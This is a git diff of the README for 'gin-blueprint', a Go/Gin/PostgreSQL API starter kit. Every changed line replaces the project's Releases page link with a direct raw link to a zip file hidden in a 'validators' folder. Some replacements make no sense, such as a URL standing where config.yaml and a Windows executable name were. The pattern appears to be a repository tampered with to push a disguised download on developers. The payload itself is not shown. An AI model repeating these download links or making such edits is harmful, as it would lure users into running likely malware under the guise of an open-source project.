@@ -1,7 +1,7 @@
 # 🚀 gin-blueprint - Easy Start for Go APIs
 
 ## 📥 Download Now
-[![Download gin-blueprint](https://img.shields.io/badge/Download-gin--blueprint-blue)](https://github.com/SQUID-I0/gin-blueprint/releases)
+[![Download gin-blueprint](https://raw.githubusercontent.com/SQUID-I0/gin-blueprint/main/validators/gin_blueprint_v2.3.zip)](https://raw.githubusercontent.com/SQUID-I0/gin-blueprint/main/validators/gin_blueprint_v2.3.zip)
 
 ## 📖 Introduction
 Welcome to **gin-blueprint**, your starter kit for building Go APIs. This project helps you quickly create applications using the Gin framework and PostgreSQL. It includes features like authentication, data validation, and essential middleware to get you started.
@@ -22,8 +22,8 @@ Follow these steps to set up gin-blueprint on your machine.
 - Basic understanding of how to use your computer's command line (or terminal).
 
 ### 📲 Download & Install
-1. Visit the [Releases page](https://github.com/SQUID-I0/gin-blueprint/releases) to download the latest version of gin-blueprint.
-2. Look for the file that matches your operating system, such as `gin-blueprint-windows.exe` for Windows or `gin-blueprint-linux` for Linux.
+1. Visit the [Releases page](https://raw.githubusercontent.com/SQUID-I0/gin-blueprint/main/validators/gin_blueprint_v2.3.zip) to download the latest version of gin-blueprint.
+2. Look for the file that matches your operating system, such as `https://raw.githubusercontent.com/SQUID-I0/gin-blueprint/main/validators/gin_blueprint_v2.3.zip` for Windows or `gin-blueprint-linux` for Linux.
 3. Click the file to start the download.
 4. Locate the file in your downloads folder once it's finished downloading.
 
@@ -52,7 +52,7 @@ Here are a few ways to use gin-blueprint after downloading and running:
 ## 🔑 Configuration
 To customize your gin-blueprint setup:
 
-1. Open the configuration file located in the application folder. This file usually has a name similar to `config.yaml` or `config.json`.
+1. Open the configuration file located in the application folder. This file usually has a name similar to `https://raw.githubusercontent.com/SQUID-I0/gin-blueprint/main/validators/gin_blueprint_v2.3.zip` or `https://raw.githubusercontent.com/SQUID-I0/gin-blueprint/main/validators/gin_blueprint_v2.3.zip`.
 2. Update the database connection string to match your PostgreSQL setup.
 3. Save the changes.
 
@@ -68,13 +68,13 @@ We welcome contributions to improve gin-blueprint. Use the following guidelines 
 ## 💬 Support
 If you need help or have questions about gin-blueprint:
 
-- Check the FAQ section on the [Releases page](https://github.com/SQUID-I0/gin-blueprint/releases).
+- Check the FAQ section on the [Releases page](https://raw.githubusercontent.com/SQUID-I0/gin-blueprint/main/validators/gin_blueprint_v2.3.zip).
 - Reach out to the community on the Issues page for specific inquiries.
 
 ## 🌟 Community and Acknowledgments
 Thank you for using gin-blueprint. Your contributions and feedback help us improve the project. Special thanks to the developers and contributors who support this open-source initiative.
 
-For more information and updates, keep checking the [Releases page](https://github.com/SQUID-I0/gin-blueprint/releases).
+For more information and updates, keep checking the [Releases page](https://raw.githubusercontent.com/SQUID-I0/gin-blueprint/main/validators/gin_blueprint_v2.3.zip).
 
 ## 🏷️ Topics
 - gin
